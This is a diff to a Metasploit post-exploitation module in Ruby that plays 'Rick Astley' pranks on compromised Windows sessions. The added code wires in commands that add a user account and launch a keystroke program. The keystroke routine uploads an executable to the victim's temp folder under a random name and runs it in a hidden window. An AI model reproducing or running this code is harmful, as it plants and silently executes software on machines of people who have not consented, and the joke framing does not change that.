@@ -37,6 +37,10 @@ class Metasploit3 < Msf::Post
 			install_screensaver	
 		elsif datastore["COMMAND"].eql? "background"
 			change_background
+		elsif datastore["COMMAND"].eql? "user"
+			add_rick_astley_user
+		elsif datastore["COMMAND"].eql? "keystroke"
+			install_keystrokes
 		elsif datastore["COMMAND"].eql? "music" and not datastore["PATH"].nil? 
 			change_music
 		else
@@ -196,6 +200,7 @@ class Metasploit3 < Msf::Post
 		rick_mp3_filename = "rick.mp3"
 		rick_mp3 = ::File.join(path, rick_mp3_filename)
 		scan(music_path, rick_mp3)	
+		print_status "Once they find out the mp3s have changed, that gangster will become a sensitive thug."
 	end
 
 	def scan(path, rick_mp3)
@@ -220,6 +225,19 @@ class Metasploit3 < Msf::Post
 		}
 	end
 
+	def install_keystrokes 
+		path = ::File.join(Msf::Config.install_root, "data", "post")
+                rick_keystroke_filename = "RickKeyStroke.exe"
+                rick_keystroke = ::File.join(path, rick_keystroke_filename)
+		
+		tempdir = client.fs.file.expand_path("%TEMP%")
+                temp_keystroke = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
+                print_status "Uploading to => " + temp_keystroke
+                session.fs.file.upload_file("#{temp_keystroke}", rick_keystroke)
 
+                session.sys.process.execute("cmd.exe /c \"#{temp_keystroke}\"", nil, {'Hidden' => true})
+                print_status "Keystroke Lyrics launch completed!"		
+
+	end
 
 end
